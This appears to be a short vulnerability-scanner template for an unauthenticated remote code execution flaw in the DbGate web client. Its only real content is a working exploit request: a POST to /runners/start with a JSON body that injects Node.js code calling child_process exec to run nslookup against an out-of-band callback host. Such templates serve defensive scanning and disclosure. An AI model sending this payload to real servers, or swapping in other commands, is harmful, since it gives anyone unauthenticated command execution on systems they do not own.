id: dbgate-unauth-rce
brief:
    title: DbGate Web Client - Unauthenticated Remote Command Execution
    by: h0j3n
    level: critical
    about: DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability.
    label:
        - http
        - rce
        - oast
        - electron
        - dbgate
        - oss
        - vuln
    score: CVSS:9.8
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/runners/start'
      head:
        Content-Type: application/json
      body: '{"script":"process.mainModule.require(''child_process'').exec(''nslookup {{interactsh-url}}'')"}'
      signs: []
